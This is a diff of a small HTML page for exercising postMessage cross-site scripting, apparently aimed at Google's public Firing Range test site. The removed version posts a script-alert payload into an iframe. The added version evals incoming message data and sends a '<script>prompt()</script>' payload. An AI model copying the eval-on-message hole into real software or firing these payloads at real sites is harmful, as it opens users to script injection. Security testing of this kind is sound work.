@@ -1,21 +1,24 @@
 <!DOCTYPE html>
-<html> 
- <head>
-   <script>
-var target = document.getElementById('target')
+<html>
+<head><title>Toxic DOM</title></head>
+<body>
+  <script>
+    // The malicious payload to be executed by eval
+    var maliciousPayload = '{ "isActive": true; alert("XSS Vulnerability Exploited!"); }';
 
-target.addEventListener('load', () => {
+    var postMessageHandler = function(msg) {
+      var content = msg.data;
+      var msgObj = eval(content);
 
-target.contentWindow.postMessage({
-    "type": "redacted",
-    "data": "<script>alert(document.domain)</script>"}, '*')
-})
-target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
-   </script>
- <meta charset="utf-8">    
- <meta name="viewport" content="width=device-width">   
-  </head>
-    <body>  
-       <iframe id=target></iframe>  
-    </body>
+      if (msgObj.isActive) {
+        document.write("PostMessage arrived!");
+      }
+    }
+
+    window.addEventListener('message', postMessageHandler, false);
+
+    // Sending the malicious postMessage to trigger the exploit
+    window.parent.postMessage('<script>prompt()</script>', '*');
+  </script>
+</body>
 </html>
